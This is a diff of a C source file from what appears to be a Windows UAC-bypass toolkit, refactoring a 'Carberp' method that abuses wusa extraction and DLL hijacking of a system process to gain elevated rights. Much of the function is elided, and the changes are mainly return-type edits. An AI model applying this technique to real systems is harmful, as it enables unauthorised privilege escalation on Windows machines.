@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2018
+*  (C) COPYRIGHT AUTHORS, 2014 - 2019
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -29,16 +29,16 @@
 * Fixed in Windows 10 TH1
 *
 */
-BOOL ucmWusaMethod(
+NTSTATUS ucmWusaMethod(
     _In_ UCM_METHOD Method,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL   bResult = FALSE;
-    WCHAR  szSourceDll[MAX_PATH * 2];
-    WCHAR  szTargetProcess[MAX_PATH * 2];
-    WCHAR  szTargetDirectory[MAX_PATH * 2];
+    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
+    WCHAR       szSourceDll[MAX_PATH * 2];
+    WCHAR       szTargetProcess[MAX_PATH * 2];
+    WCHAR       szTargetDirectory[MAX_PATH * 2];
 
     _strcpy(szTargetProcess, g_ctx->szSystemDirectory);
     _strcpy(szTargetDirectory, g_ctx->szSystemDirectory);
@@ -67,14 +67,11 @@ BOOL ucmWusaMethod(
         break;
 
     default:
-        return FALSE;
+        return STATUS_INVALID_PARAMETER;
     }
 
     if (!PathFileExists(szTargetProcess)) {
-#ifdef _DEBUG
-        supDebugPrint(TEXT("ucmWusaMethod"), ERROR_FILE_NOT_FOUND);
-#endif
-        return FALSE;
+        return STATUS_OBJECT_NAME_NOT_FOUND;
     }
 
     //
@@ -90,10 +87,11 @@ BOOL ucmWusaMethod(
 
         if (ucmWusaExtractPackage(szTargetDirectory)) {
             //run target process for dll hijacking
-            bResult = supRunProcess(szTargetProcess, NULL);
+            if (supRunProcess(szTargetProcess, NULL))
+                MethodResult = STATUS_SUCCESS;
         }
         ucmWusaCabinetCleanup();
     }
 
-    return bResult;
+    return MethodResult;
 }
